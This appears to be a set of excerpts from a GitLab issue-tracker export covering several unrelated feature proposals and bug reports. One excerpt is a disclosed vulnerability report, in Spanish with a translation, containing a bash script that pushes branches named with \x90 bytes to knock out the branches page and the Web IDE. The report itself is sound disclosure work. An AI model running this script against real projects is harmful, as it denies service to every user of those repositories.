However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n[List deploy token APIs](https://docs.gitlab.com/ee/api/deploy_tokens.html) allow filtering for only active tokens.\n\n### Problem to solve \n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\nThe Deploy Tokens API endpoints for listing tokens (project/group/etc. levels) return all database stored entries, including revoked and expired tokens.\n\nFurthermore, the revoke state is not added to the returned entity, so an end-user cannot perform a client-side filter removing revoked tokens from the list returned.\n\nThe feature proposed here will resolve the need to list only active tokens from the REST API.\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n--\u003e\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\nThe user should be able to use the API to retrieve only, or properly filter for, currently active tokens.\n\n\n### Proposal\n\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\nTwo changes:\n\n- Add a filter params `revoked` and `expired`, of boolean types, that filter the returned response of all tokens.\n  - `revoke` being true will return only revoked tokens\n  - `revoke` being false will return only un-revoked tokens\n  - `expired` being true will return only expired tokens\n  - `expired` being false will return only un-expired tokens\n  - Both filters as true will return actual active tokens, matching [list shown on the Web UI](https://docs.gitlab.com/ee/user/project/deploy_tokens/#revoking-a-deploy-token)\n- Add `revoked` state key-values to the returned `DeployToken` entity to allow end-users to differentiate between revoked and un-revoked tokens in any response.\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\nCame up in a Premium plan customer's support request https://gitlab.zendesk.com/agent/tickets/183005 (internal)\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\nExisting permissions over the Deploy Tokens API endpoints remain sufficient.\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\nDeploy Tokens API documentation for list actions will require updates: https://docs.gitlab.com/ee/api/deploy_tokens.html\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\nExisting API tests will require changes to cover filters for list queries, and for the new `revoked` field returned in the response.\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n--\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt.

Instead of focusing our energy on adding every single item in UX and then dealing with the inevitable response (Too many things in the UI, its cluttered, etc) -- it would be great to make them discoverable.\n\n## Proposal \n\nIf we want to improve -we need to measure, experiment, measure.\n\nPlace a :white_check_mark: next to each command once MAU counters have been added for each. \n\n| Command                                                   | Issue | Merge request | Epic | Action                                                                                                                                                                                                                                                                                                              |\n|-----------------------------------------------------------|-------|---------------|------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| /approve                                                  |       | ✓             |      | Approve the merge request.                                                                                                                                                                                                                                                                                          |\n| /assign @user                                             | ✓     | ✓             |      | Assign one user.                                                                                                                                                                                                                                                                                                    |\n| /assign @user1 @user2                                     | ✓     | ✓             |      | Assign multiple users.                                                                                                                                                                                                                                                                                              |\n| /assign me                                                | ✓     | ✓             |      | Assign yourself.                                                                                                                                                                                                                                                                                                    |\n| /award :emoji:                                            | ✓     | ✓             | ✓    | Toggle emoji award.                                                                                                                                                                                                                                                                                                 |\n| /child_epic \u003cepic\u003e                                        |       |               | ✓    | Add child epic to \u003cepic\u003e.

This experiment was deemed a success via this tracking issue https://gitlab.com/gitlab-org/gitlab/-/issues/238207 and thus the experience should be made permanent. \n \nThis issue should be closed out when the experiment code is removed and this experience is live on production for 100% of users.\n\n## Steps\n\n- [X] Determine whether the feature should apply to SaaS and/or self-managed\n  * This should appear only in SaaS as the page the experiment was run on (GitLab.com billings page) only exists for SaaS users\n- [X] Determine whether the feature should apply to EE - and which tiers - and/or Core\n  * This should appear for all users within the SaaS product regardless of their tier as long as they have the permissions that allow them to view the in-app billings page. \n- [X] Determine if tracking should be kept as is, removed, or modified.\n  * Tracking should be left intact as it allows us to understand on an ongoing basis how many leads this work is sending to the sales team. \n- [-] Migrate experiment to a default enabled [feature flag](https://docs.gitlab.com/ee/development/feature_flags/development.html) for one milestone and add a changelog.

It seems that with `availability` added to user status that takes one of two states `not_set` or `busy` when user clicks remove status button, or clear message and emoji manually, `availability` is still send as `not_set` within request. Due to that at [`User::SetStatusService`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/users/set_status_service.rb#L17) this request is misinterpreted as status update instead of status removal, that seems to later cause described problems where status seems to be removed, but `current_user.status.present?` continues to evaluate to true. \n    \u003e \n    \u003e This comment is not blocking though, because your approach improves UX even if underlying backend problem remains.

The directive allowed the data to be stored in Apollo's cache with a static key, making it easier to read/write the cached query. More on this here: https://www.apollographql.com/docs/react/v2/caching/cache-interaction/#the-connection-directive\n* https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48940 introduced a test where the above query was being mocked via `mock-apollo-client`, which is what actually broke `master`.\n\n# Why?\n\nWhat exactly happened is similar to what's described in this `apollo-client` issue: https://github.com/apollographql/apollo-client/issues/2518\n\nWhen it encounters a `@connection` directive, `apollo-client` strips it out of the cache key when caching the data.\n\nThe thing is that `mock-apollo-client` uses `apollo-client`'s [actual cache layer](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockClient.ts#L24-L27), but it provides its own [mocked link](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockClient.ts#L29), with its own way of building [cache keys](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockLink.ts#L58-L66) that does _not_ strip the `@connection` directive.\n\nThis results in a discrepancy between mocked request handlers and what's actually in the cache, as any query containing a `@connection` query can not be traced back to the cache.\n\nSo, when mocking `apollo-client` in tests, queries containing a `@connection` directive would always be considered not mocked and would never resolve properly.\n\n# How do we fix this?\n\n- [x] Revert the changes that caused the failure.\n  * The failure was

desarrollador que empuja cualquier rama con un nombre que contenga la notación hexadecimal `\\xH`, por ejemplo `\\x90`, es capaz de hacer que la pagina en `/-/branches` no este disponible para todos los usuarios, dando como resultado una perdida de disponibilidad en este componente.\n\nOtro componente afectado por esta vulnerabilidad es el __Web IDE__, si bien es cierto que se puede acceder a esta característica, usted no podrá trabajar con normalidad, ya que, al intentar seleccionar algunas de las ramas del proyecto recibiera el siguiente mensaje por parte del servidor *“Error al cargar ramas \\ inténtelo de nuevo”*\n\nPara llevar a cabo este ataque el atacante solo debe crear una rama con el nombre `\\x90`, hacer una confirmación y empujar la rama. Sin embargo he desarrollado un pequeño script en __bash__ que además crea ramas con este nombre de forma recursiva.  \n \n\n_Translated by Google_\n\nA developer who pushes any branch with a name that contains the hexadecimal notation \\ xH, for example \\ x90, is able to make the page in / - / branches not available to all users, resulting in a loss of availability in this component.\nAnother component affected by this vulnerability is the Web IDE, although it is true that this feature can be accessed, you will not be able to work normally, since, when trying to select some of the project branches, you will receive the following message from the server \"Failed to load branches \\ try again\"\nTo carry out this attack, the attacker only has to create a branch with the name \\ x90, make a confirmation and push the branch. However, I have developed a small bash script that also recursively creates branches with this name.\n   \n#####  Steps to reproduce\n\n__[Preparación]__\n\n__1)__ Ingrese a Gitlab.com\n\n__2)__ Cree un proyecto nuevo.\n\n__3)__ Invite un nuevo miembro con permisos de desarrollador.  \n\n\n \n   \n__[Flujo del ataque]__ *(miembro invitado con permisos de desarrollador)*\n\n__1)__ Clone e ingrese al proyecto.\n\n__2)__ Establezca su configuración de username e email. *(git config --global user.name ‘username’)...*\n\n__3)__ Copie las siguientes líneas escritas en __bash__ y péguelas en su archivo `~/.bashrc`: ![exploit.txt](https://h1.sec.gitlab.net/a/b5a6009a-eba5-4452-be6f-d2f2a0db39b8/exploit.txt)\n\n\n_Translated by Google_\n\n1) Go to Gitlab.com\n2) Create a new project.\n3) Invite a new member with developer permissions.\n\n[Attack flow] (guest member with developer permissions)\n1) Clone and enter the project.\n2) Set your username and email settings. (git config --global user.name 'username') ...\n3) Copy the following lines written in bash and paste them into your ~ / .bashrc file:\n\n```bash  \n###  Copy and Paste in ~/.bashrc  \n###  You must run this script from a terminal with the bash interpreter\n\nfunction createStoreDir(){  \n  nops_dir=$(mktemp -d)  \n}\n\nfunction genNop(){  \n  branchName=\\\\x90  \n  nop=  \n  limitNops=$1  \n  for name in $(seq 1 $limitNops);do  \n    nop+=\\\\x90  \n    echo $nop  \n  done  \n}\n\nfunction createBranches(){  \n  for line in $(cat $nops_dir/nops_$1.txt);do  \n     git checkout -b $(echo -e $line)  \n     echo \u0026#39;DoS\u0026#39; \u0026gt; DoS  \n     git add .  \n     git commit -m \u0026#39;DoS\u0026#39;  \n  done  \n}\n\nfunction pushBranches(){  \n  for branch in $(cat $nops_dir/nops_$1.txt);do  \n    (git push origin $(echo -e $branch) \u0026amp;)  \n  done  \n}\n\nfunction main(){  \n  args=$1  \n  createStoreDir\n\n  if [ -d \u0026#34;./.git\u0026#34; ];then  \n    for arg in ${args[@]};do  \n      genNop $arg \u0026gt; $nops_dir/nops_$arg.txt  \n      createBranches $arg  \n      pushBranches $arg  \n    done  \n  else  \n   echo \u0026#34;No Git folder\u0026#34;  \n  fi  \n}\n\nfunction exploit(){  \n  main $1 \u0026amp;\u0026gt;/dev/null  \n}\n```\n\n__4)__ Desde una terminal y con el interprete de __bash__ ejecute el comando `exec bash` para refrescar el archivo.\n\n__5)__ Ahora estando dentro de la carpeta del proyecto que ha clonado ejecute la función `exploit 1`\n\nCon esto es suficiente para que la pagina de `/-/branches`  no este disponible para todos los usuarios, además de afectar también el funcionamiento de `Web IDE`. Cabe destacar que el script esta preparado para efectuar esta misma operación de forma recursiva, si usted ejecuta por ejemplo `exploit 5` estaría empujando cinco ramas con el carácter hexadecimal `\\x90` quedando ``branch1=\\x90` `branch2=\\x90\\x90` `branch3=\\x90\\x90\\x90` ..., y así sucesivamente dependiendo del valor del argumento de la función `exploit $1`, causaría el mismo daño solo que con mas ramas.\n\nResultado : https://gitlab.com/user_V/pocdos/-/branches  \n\n_Translated by Google_\n\n__4) __ From a terminal and with the __bash__ interpreter, execute the command `exec bash` to refresh the file.\n\n__5) __ Now being inside the folder of the project that you have cloned, execute the function `exploit 1`\n\nThis is enough so that the `/ - / branches` page is not available to all users, as well as affecting the operation of` Web IDE`. It should be noted that the script is prepared to perform this same operation recursively, if you execute for example `exploit 5` you would be pushing five branches with the hexadecimal character` \\ x90` leaving `` branch1 = \\ x90` `branch2 = \\ x90 \\ x90` `branch3 = \\ x90 \\ x90 \\ x90` ..., and so on depending on the value of the argument of the` exploit $ 1` function, it would cause the same damage only as with more branches.\n \n   \n#####  What is the current *bug* behavior?  \nDespués de empujar una rama con el nombre de `\\x90`, la ruta `/-/branches` no estará disponible para todos los usuarios, además `Web IDE` no funciona correctamente.  \n\nAfter pushing a branch with the name of `\\ x90`, the path` / - / branches` will not be available to all users, also `Web IDE` does not work properly.\n \n   \n#####  What is the expected *correct* behavior?  \nLa aplicación no debería decodificar estos caracteres. (\\x90)  \n\nThe application should not decode these characters.

However, the related stage and pipeline show as `success`. This confuses users making them think that there is something wrong with the pipeline processing.\n\n### Steps to reproduce\n\n```yaml\nbuild:\n  stage: build\n  script: echo\ntest:\n  stage: test\n  script: echo\ntrigger:\n  stage: test\n  trigger:\n    include: child.yml\n    strategy: depend\n  allow_failure: true\n\n# in child.yml\nbuild:\n  script: exit 1\n```\n\nThis configuration should cause a pipeline and Test stage to have `success` status\n\n## Expected behavior\n\nThe pipeline and stage should show `success with warnings` status because the bridge job fails with `allow_failure: true`.\n\n## Solution\n\nFrom https://gitlab.com/gitlab-org/gitlab/-/issues/292211#note_462212352:\n\nThe problem with the stage is [located here](https://gitlab.com/gitlab-org/gitlab/-/blob/2392290c6165d7464aa3b1437e0cb45dfc5c9f3f/app/models/ci/stage.rb#L121), where we use `Ci::Build` to look for jobs with warnings. This would not consider `Ci::Bridge` jobs which is the case of `trigger:`. We should replace `Ci::Build` with `CommitStatus` as we do [for LegacyStage](https://gitlab.com/gitlab-org/gitlab/-/blob/6fa7ab7496ffe6c7febe5aeb14be8ed3060cd300/app/models/ci/legacy_stage.rb#L63).\n\nSame problem with pipelines: https://gitlab.com/gitlab-org/gitlab/-/blob/b08717a8dc941140c0e1ffc5a9776fe35ff97101/app/models/ci/pipeline.rb#L660 (we use `Ci::Build` instead of `CommitStatus` which is more generic).\n\n\u003cdetails\u003e\n  \u003csummary\u003eOriginal description for reference\u003c/summary\u003e\n\n### Summary\n\nIn a parent-child pipeline setup where the [trigger](https://docs.gitlab.com/ee/ci/yaml/#trigger) strategy is set to `depend`, the parent pipeline succeeds even though some of its child pipelines fail. The child pipelines belong to external projects.\n\n### Steps to reproduce\n\nBased on the [Example project](#example-project) where this occurred, it should be possible to reproduce the bug by doing the following:\n \n1. create a project with a parent pipeline that triggers child pipelines in external projects\n1. set the `trigger:strategy` to `depend`\n1. ensure the child pipeline fails\n1.

Possible requirements:\n\n1. On the backend, changing a flag or the contents of the array of widgets should hide this widget from a specific issue type.\n\n   This prepares us for custom issue types and this means that everything already depends on the backend for this widget's visibility.\n\n1. Provide hooks that get executed when this widget is added / removed\n\n   This is useful when we want to support switching types. So that when an issue is switched into a type that does not have assignees, the \"remove\" hook must be triggered and vice versa.\n\n   This is needed so that we can remove the data when the widget is removed so that the issues don't show up in the issue list when filtering by assignee.\n\n### Acceptance Criteria\n\n- Update https://docs.gitlab.com/ee/development/issue_types.html to reflect the current status of issue types, reference architectures for widgets, how to create a new type, and so on.\n\n## Availability and Testing\n\nManual job `package-and-qa` will need to be run in the MR to ensure e2e tests do not break.","state":"closed","created_at":"2020-12-07T15:43:07.124Z","updated_at":"2021-10-04T08:49:13.795Z","closed_at":"2021-05-17T17:46:55.191Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Enterprise Edition","GitLab Starter","[deprecated] Accepting merge requests","backend","devops::plan","direction","group::project management","missed:13.8","missed:13.9","quad-planning::complete-action","section::dev","workflow::ready for development"],"milestone":{"id":1850113,"iid":60,"group_id":9970,"title":"14.0","description":"","state":"closed","created_at":"2021-01-26T16:55:07.714Z","updated_at":"2022-04-21T07:25:17.749Z","due_date":"2021-06-17","start_date":"2021-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/60"},"assignees":[],"author":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"type":"ISSUE","assignee":null,"user_notes_count":50,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/292035","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/292035","notes":"https://gitlab.com/api/v4/projects/278964/issues/292035/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/292035/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#292035","relative":"#292035","full":"gitlab-org/gitlab#292035"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5302,"epic":{"id":192912,"iid":5302,"title":"Refactor issue sidebar to Vue + Apollo client","url":"/groups/gitlab-org/-/epics/5302","group_id":9970,"human_readable_end_date":"Mar 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":75716771,"iid":292031,"project_id":278964,"title":"Improve default sorting on Single Environment Page","description":"\u003c!-- The first section \"Release notes\" is required if you want to have your release post blog MR auto generated.

The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\nCurrently, the Environments page sorts the list of deployments by the most recent commit SHA change. To make it easier to view deployments over time, we have changed the default sorting order of this list to be by deployment itself rather than the most recent commit. You can now see the most recent deployment at the top of the page and the rest of your deployments in descending order by deployment date.\n\n\u003c!-- What is the problem and solution you're proposing?

analyzer to use GitLeaks v7.2.0","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal \nGitleaks recently released a major version that includes some nice features that will reduce the amount of [pre-processing](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/analyze.go#L45-56) the Secrets Analyzer has to do. Two features the analyzer could make use of: `--no-git`, and `LeakURL`. v7.0.0 also includes a fix for the wrong line number reported in https://gitlab.com/gitlab-org/gitlab/-/issues/287696.\n\nv7.1.0 introduced `--leaks-exit-code=` which means we can remove the extra exit code processing [here](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/gitleaks/gitleaks.go#L168-181)\n\nv7.1.1 fixes a bug with allowlists which is essential for our analyzer.\n\n\n### Implementation\n- [x] Update Dockerfile to pull gitleaks v7.2.0\n- [x] Update the [analyze](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/analyze.go#L58-63) and gitleaks [Run](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/gitleaks/gitleaks.go#L110) function to be compliant with v7.2.0.\n- [x] Update tests\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n\u003c!-- Consider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n\n\n--\u003e","state":"closed","created_at":"2020-12-07T15:11:12.938Z","updated_at":"2021-10-28T14:02:56.652Z","closed_at":"2021-02-03T14:49:44.670Z","closed_by":{"id":5211947,"username":"zrice","name":"Zach

This naming convention has some problems as it is too restrictive to some users or ~\"self-managed\" instances.\n\nThe implementation has been done before my time but I think that the naming convention is mainly used to locate the proper package when hitting the instance level API. Basically, the ~backend  receives: hey, I need package `X` and that's it, no group id, no project id. With the only information of the package name, the ~backend has to accurately locate the package within all projects accessible for the current user.\n\nThis naming convention is implemented as a [model validator](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/packages/package.rb#L37), which means that before a npm package is saved to the database, the package name has to be conform to the naming convention, which means that *all* npm packages need to be ok with that convention.\n\n### Proposal \n\nUse the same approach as we have in the [Maven API](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#configuring-your-project-to-use-the-gitlab-maven-repository-url):\n\n* At the Project level\n   * Don't impose any naming restriction. Users are free to use whatever they want, including not using an `@scope` at all.\n* At the Instance level\n   * Similar to [maven](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#instance-level-maven-endpoint), *only* the packages that follow the naming convention are exposed via this API level.\n   * If a package doesn't follow the naming convention, it can't be retrieved with the instance level API.\n\n### Other considerations\n\nIf one day, we ever implement the Group level API, I think we can follow again what we have for the [Maven api](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#configuring-your-project-to-use-the-gitlab-maven-repository-url):\n* At the Group level\n   * Don't impose any naming convention\n   * What about duplicated package names? Use the same strategy as on the Maven API:\n\n\u003e The group level endpoint works with any package names, which means the you have the flexibility of naming compared to instance level endpoint. However, GitLab will not guarantee the uniqueness of the package names within the group. You can have two projects with the same package name and package version. As a result, GitLab will serve whichever one is more recent. \n\n### Work complexity\n\nIt should be quite low as we \"only\" have:\n* remove the model validator\n* make sure that the instance level API locate the package using the naming convention (should be already the case, so nothing to do).\n* make sure that the project level API works with any package name (rspec example)\n* make sure that the instance level API works with *only* package names that follow the naming convention (rspec example)","state":"closed","created_at":"2020-12-07T12:51:53.322Z","updated_at":"2020-12-07T22:38:27.355Z","closed_at":"2020-12-07T22:38:26.946Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Package Registry","backend","devops::package","group::package registry","npm Registry","ruby"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now.

cadences](https://docs.gitlab.com/ee/user/group/iterations/#iteration-cadences) of groups. If you've been using Iteration cadences to automate creating your iterations or automatically roll over incomplete issues to the next iteration, this information and configuration will be migrated along with your groups.\n\nDocumentation: https://docs.gitlab.com/ee/user/group/import\n\n## Original problem \n\nWe currently do not include iterations in our import / export. This also applies to `resource_iteration_events`, `resource_milestone_events`, and `resource_state_events` and iteration board lists.\n\nWe need the resource events so that burndown / burnup charts are imported / exported correctly.\n\nI'm not sure how this would work with project exports though because iterations are currently at the group level. Does this mean we cannot include issue iterations and project board iteration lists in our project exports?\n\n## Proposed solution\n\nIterations are already migrated as part of the GitLab Migration. And so are Issues. What we need to add is the connection. We already do something similar for Epics and Issues (for example).","state":"closed","created_at":"2020-12-07T07:41:56.864Z","updated_at":"2022-10-10T13:21:26.955Z","closed_at":"2022-09-20T11:12:17.496Z","closed_by":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"labels":["Category:Importers","Importer:GitLab Migration","Next Up","backend","customer","devops::manage","documentation","group::import","quad-planning::complete-no-action","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"}],"author":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"type":"ISSUE","assignee":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"user_notes_count":31,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/291983","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/291983","notes":"https://gitlab.com/api/v4/projects/278964/issues/291983/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/291983/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#291983","relative":"#291983","full":"gitlab-org/gitlab#291983"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4618,"epic":{"id":126563,"iid":4618,"title":"GitLab Migration - Projects Phase 2","url":"/groups/gitlab-org/-/epics/4618","group_id":9970,"human_readable_end_date":"Oct 30, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":75684818,"iid":291979,"project_id":278964,"title":"Unlink Dependency Proxy temp files immediately","description":"## Problem\n\nThe [`DependencyProxy::DownloadBlobService`](https://gitlab.com/gitlab-org/gitlab/blob/master/app/services/dependency_proxy/download_blob_service.rb#L12) does not ensure removal of the temp file.\n\n## Solution\n\nIt should be cleaned up to take a block and properly clean up the file as we added in the [PullManifestService](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48845/diffs#2842a0573cf07059df4d3b7dd0c7718876cbcdf3) in !48845\n\n### Update\n\n**Note**:\nAs mentioned [here](https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5042#note_616918800), the file needs to be unlinked immediately after the `TempFile` is created.

This will allow users to get a full picture of the deployment frequency across projects and teams, so that they can comprehend their efficiency more accurately.  \n\n### Problem to solve \n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\nAs an executive investing in DevOps, I want to see my ROI.

So this should be taken into consideration when developing this API.\n\nAlso in the future we would want to add support for the environment that there was a `deployment` to. In the true sense of DORA 4 - this is only meant for production, but there may be more than one prod environment and/or users may interested in non-prod environments  \n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\nThere is another consideration: some additional work to create a data structure (tables) to store the metrics, and I think this should be designed so it is flexible enough to:\n\n* commonly capture the data for all metrics\n* support a view at Project or any level of Group\n* support a minimal time slice which could then be aggregated\n\nThis is one metric out of 4 so there needs to be a common API structure to meet all needs.\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section.

